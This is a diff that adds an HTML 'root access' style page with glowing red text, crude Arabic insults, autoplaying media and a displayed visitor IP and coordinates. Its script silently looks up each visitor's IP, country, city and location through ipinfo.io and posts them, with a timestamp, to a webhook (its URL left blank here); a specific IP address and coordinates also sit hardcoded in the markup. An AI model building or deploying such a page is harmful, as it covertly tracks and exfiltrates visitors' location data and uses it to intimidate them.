@@ -1,0 +1,149 @@
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Abo 7sn &amp; Root Access</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Courier New', Courier, monospace;
+        color: red; 
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        text-align: center;
+        overflow: hidden;
+        background-color: black;
+    }
+
+    .background-video {
+        display: none;
+    }
+
+    .content {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 1;
+        position: relative;
+        height: 100vh;
+        width: 100%;
+    }
+
+    .background-video-second {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1;
+    }
+
+    .info {
+        margin-top: 20px;
+        font-size: 1.5em;
+        color: red;
+        text-shadow: 0px 0px 8px red, 0px 0px 15px red, 0px 0px 25px red;
+        letter-spacing: 4.5px;
+        white-space: pre-wrap;
+    }
+
+    .text {
+        margin-top: 20px;
+        font-size: 3em;
+        color: red;
+        text-shadow: 0px 0px 8px red, 0px 0px 15px red, 0px 0px 25px red;
+        letter-spacing: 4.5px;
+    }
+
+    .marquee {
+        position: absolute;
+        top: 10%;
+        width: 100%;
+        overflow: hidden;
+        white-space: nowrap;
+    }
+
+    .marquee span {
+        display: inline-block;
+        font-size: 5em;
+        color: red;
+        text-shadow: 0px 0px 8px red, 0px 0px 15px red, 0px 0px 25px red;
+        letter-spacing: 4.50px;
+        animation: scroll 80s linear infinite;
+    }
+
+    @keyframes scroll {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(100%); }
+    }
+
+    .image-container img {
+        max-width: 50%;
+        height: auto;
+        margin: 20px auto;
+        display: block;
+        filter: drop-shadow(0 0 0 red) drop-shadow(0 0 2px red) drop-shadow(0 0 4px red);
+    }
+</style>
+</head>
+<body>
+
+<div class="content">
+    <video class="background-video-second" autoplay="" loop="" muted="">
+        <source src="https://cdn.discordapp.com/attachments/938536293388931153/1361017257190363187/U_S_S_R_1_9_9_1_Molchat_Doma_-_Sudno.mov?ex=684f9f58&amp;is=684e4dd8&amp;hm=2571c522dd38d6a363a25e14e37b1bfd100501f8afd43ebae5ba26fad9509757&amp;" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="marquee">
+        <span>تمضمض بالكب تبعي - كبيت عايدك - كبيت عراسك - كبيت عبزازك - كبيت عطيزك</span>
+    </div>
+
+    <div id="content">
+        <div class="image-container">
+            <img src="https://api3.schooltv.nl/cache/i/43000/images/43090.w856.r16-9.540f486.q90.jpg" alt="">
+        </div>
+
+        <div class="info" id="ip-info"><strong>مجلس العرب لعب عليكو</strong><br>
+ <strong>Your Ip:</strong> <span>93.175.45.193</span><br>
+<strong>Your Location:</strong> <span>32.6926,35.3712</span></div>
+        <div class="text"> مجلس العرب لعب عليكو
+ </div>
+
+<audio autoplay="" loop="">
+    <source src="https://audio.jukehost.co.uk/IepS1MTHdXslLV0SZ1IBlPKwNmU4z9Wg" type="audio/mpeg">
+    Your browser does not support the audio element.
+</audio>
+
+    </div>
+</div>
+
+<script>
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `<strong>مجلس العرب لعب عليكو</strong><br>
+ <strong>Your Ip:</strong> <span>${ip}</span><br>
+<strong>Your Location:</strong> <span>${loc}</span>`;
+
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = '';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
+                })
+            });
+        });
+</script>
+
+
+
+</body></html>
